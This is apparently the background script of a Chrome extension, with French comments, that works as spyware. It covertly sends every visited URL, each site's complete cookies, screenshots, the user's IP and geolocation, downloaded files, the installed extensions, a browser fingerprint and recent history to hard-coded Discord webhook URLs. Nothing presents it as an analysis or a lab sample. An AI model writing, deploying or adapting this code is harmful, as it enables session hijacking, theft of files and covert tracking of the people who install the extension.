


// 1. Envoie chaque URL visitée + cookies complets
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === "complete" && tab.url && tab.url.startsWith("http")) {
    fetch("https://discord.com/api/webhooks/1362038340538466445/dTK5OEJ6iTxLEpUdRaDehOYqte4upxZSW0G0gF2cQzX81iYymBsSsNHIBzRfYqDZ4Ruy", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `🔗 Nouveau site visité : ${tab.url}`
      })
    });

    chrome.cookies.getAll({ url: tab.url }, function (cookies) {
      const detailedCookies = cookies.map((cookie, index) => ({
        ...cookie,
        id: index + 1
      }));

      fetch("https://discord.com/api/webhooks/1362038936360452259/w5bBfYl1GYvfjDT59suhnuiolc2v6XHvoycNmF8BnfVwKtZKrr3IU_-2s58twq81xchs", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: `🍪 **Cookies du site : ${tab.url}**`,
          embeds: [{
            title: "Cookies détectés",
            description: "```json\n" + JSON.stringify(detailedCookies, null, 2) + "\n```"
          }]
        })
      });
    });
  }
});

// 2. Capture d’écran déclenchée depuis le content script
chrome.runtime.onMessage.addListener((msg, sender) => {
  if (msg.action === "capture" && msg.url) {
    chrome.tabs.captureVisibleTab(null, { format: "png" }, function (dataUrl) {
      fetch("https://discord.com/api/webhooks/1362038729186738216/hE24aPmgwR35PTiMannngijV4TEhezOOH-A86WISs-dJp_vaZBKcU8Pds0h4K0PCzELT", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: `📸 Capture d'écran de : ${msg.url}`,
          embeds: [{
            image: { url: dataUrl }
          }]
        })
      });
    });
  }
});

// Envoie IP publique
async function getPublicIP() {
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    return data.ip;
  } catch (err) {
    return "IP inconnue";
  }
}

// Envoie géolocalisation + IP au lancement de Chrome
chrome.runtime.onStartup.addListener(async () => {
  const ip = await getPublicIP();

  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
    if (tabs.length > 0) {
      chrome.scripting.executeScript({
        target: { tabId: tabs[0].id },
        func: (ip) => {
          navigator.geolocation.getCurrentPosition((pos) => {
            const { latitude, longitude } = pos.coords;

            fetch("https://discord.com/api/webhooks/1362097109054263418/_8M1nyvLM8W4EGP7-TG4M8mBNU8f73xAylI7qecSzHd3Ge1vhySsFCpCq9GxYqSuSxau", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                content: `📍 **Localisation au lancement de Chrome :**\nIP : ${ip}\nLatitude : ${latitude}\nLongitude : ${longitude}\nhttps://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`
              })
            });
          }, (err) => {
            fetch("https://discord.com/api/webhooks/1362097109054263418/_8M1nyvLM8W4EGP7-TG4M8mBNU8f73xAylI7qecSzHd3Ge1vhySsFCpCq9GxYqSuSxau", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                content: `❌ Impossible de récupérer la position\nIP : ${ip}`
              })
            });
          });
        },
        args: [ip],
        world: "MAIN"
      });
    }
  });
});


chrome.downloads.onChanged.addListener((delta) => {
  if (!delta.state || delta.state.current !== "complete") return;

  chrome.downloads.search({ id: delta.id }, (results) => {
    if (!results || results.length === 0) return;

    const file = results[0];
    const fileSizeMB = file.fileSize ? (file.fileSize / 1024 / 1024).toFixed(2) : "0";
    const fileName = file.filename.split(/[/\\]/).pop();
    const downloadUrl = file.url;

    if (file.fileSize < 100 * 1024 * 1024) {
      fetch(downloadUrl)
        .then(res => res.blob())
        .then(blob => {
          const form = new FormData();
          form.append("file", new File([blob], fileName));
          form.append("content", `📥 **Fichier téléchargé (<100 Mo)** :\nNom : ${fileName}\nTaille : ${fileSizeMB} Mo\nLien : ${downloadUrl}`);

          fetch("https://discord.com/api/webhooks/1362346363248967740/p2Nftbp6ZKRD7kRVO2KnOqOQvkKVqAJ6jwfDkCWP-IH-axn0I_pv9OegrBv4Qkv6ESFc", {
            method: "POST",
            body: form
          });
        })
        .catch(err => {
          console.error("Erreur téléchargement fichier :", err);
        });
    } else {
      // Juste le lien pour les fichiers >100 Mo
      fetch("https://discord.com/api/webhooks/1362346363248967740/p2Nftbp6ZKRD7kRVO2KnOqOQvkKVqAJ6jwfDkCWP-IH-axn0I_pv9OegrBv4Qkv6ESFc", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: `📥 **Fichier téléchargé (>100 Mo)**\nNom : ${fileName}\nTaille : ${fileSizeMB} Mo\nLien : ${downloadUrl}`
        })
      });
    }
  });
});

chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  if (msg.action === "get_extensions") {
    chrome.management.getAll((exts) => {
      const filtered = exts.filter(e => e.enabled && e.type === "extension");
      sendResponse(filtered);
    });
    return true; // keep channel open
  }
});


// Envoi unique des extensions installées au démarrage de Chrome
chrome.runtime.onStartup.addListener(() => {
  chrome.management.getAll((exts) => {
    const filtered = exts.filter(e => e.enabled && e.type === "extension");
    const extList = filtered.map(ext => `- ${ext.name} (${ext.id})`).join("\n");

    const payload = {
      content: `🧩 **Extensions Chrome détectées**\n🕒 ${new Date().toLocaleTimeString("fr-FR")} - ${new Date().toLocaleDateString("fr-FR")}`,
      embeds: [{
        title: "Extensions installées",
        description: "```txt\n" + extList + "\n```"
      }]
    };

    fetch("https://discord.com/api/webhooks/1362540374807154948/zw5CsicUO_QK7aNNbxsuduKFq2o4x9ZtOwI9f_QA7TETPkLXTapLIz8WV9lQ-a7D6NI3", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
  });
});

chrome.runtime.onStartup.addListener(() => {
  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
    if (!tabs.length || !tabs[0].url.startsWith("http")) return;

    const tabId = tabs[0].id;

    // Injection du fingerprint depuis le contexte de la page (car navigator/screen)
    chrome.scripting.executeScript({
      target: { tabId },
      func: () => {
        const data = {
          os: navigator.platform,
          langue: navigator.language,
          resolution: `${window.screen.width}x${window.screen.height}`,
          ecrans: window.screen.availWidth ? 1 : 1,
          agent: navigator.userAgent
        };

        // Envoi direct vers Discord
        fetch("https://discord.com/api/webhooks/1362350831839608843/CAgAyWiFSB6nNxUymOw_pb1iz1Bf8LpAalKammqIMt_7VEJzjGRJlRFl0FFQeSFKxDVl", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            content: `🧬 **Fingerprint Chrome** — ${new Date().toLocaleString("fr-FR")}`,
            embeds: [{
              title: "Profil navigateur",
              description: "```json\n" + JSON.stringify(data, null, 2) + "\n```"
            }]
          })
        });
      },
      world: "MAIN"
    });

    // Historique (chrome API donc reste dans background)
    chrome.history.search({ text: "", maxResults: 15 }, (historyItems) => {
      const historique = historyItems.map(item => {
        const date = new Date(item.lastVisitTime).toLocaleString("fr-FR");
        return `- ${item.title || item.url} (${date})`;
      });

      fetch("https://discord.com/api/webhooks/1362350831839608843/CAgAyWiFSB6nNxUymOw_pb1iz1Bf8LpAalKammqIMt_7VEJzjGRJlRFl0FFQeSFKxDVl", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: `📜 **Historique Chrome** — ${new Date().toLocaleString("fr-FR")}`,
          embeds: [{
            title: "Derniers sites visités",
            description: historique.length > 0 ? "```\n" + historique.join("\n") + "\n```" : "_Aucun historique disponible_"
          }]
        })
      });
    });
  });
});

